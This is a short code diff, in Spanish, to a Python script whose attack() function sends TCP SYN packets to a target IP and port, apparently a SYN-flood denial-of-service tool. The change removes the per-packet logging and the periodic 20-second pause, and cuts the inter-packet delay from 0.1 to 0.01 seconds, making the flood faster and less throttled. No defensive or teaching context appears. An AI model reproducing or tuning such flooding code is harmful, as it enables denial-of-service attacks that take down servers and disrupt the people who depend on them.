@@ -45,15 +45,15 @@ def attack():
 
                 # Enviar el paquete
                 send(packet, verbose=False)
-                print(f"Paquete TCP SYN enviado a {target_ip}:{target_port} desde {src_ip}:{src_port}")
+                #print(f"Paquete TCP SYN enviado a {target_ip}:{target_port} desde {src_ip}:{src_port}")
                 packet_count += 1
-
+                """
                 if packet_count % 200 == 0:
                     print(f"Pausa de 20 segundos... Paquetes enviados: {packet_count}")
                     time.sleep(20)
                     print("Reanudando TCP SYN Flooding")
-
-                time.sleep(0.1)  # Controla la velocidad
+                """
+                time.sleep(0.01)  # Controla la velocidad
             time.sleep(1)
 
     except Exception as e:
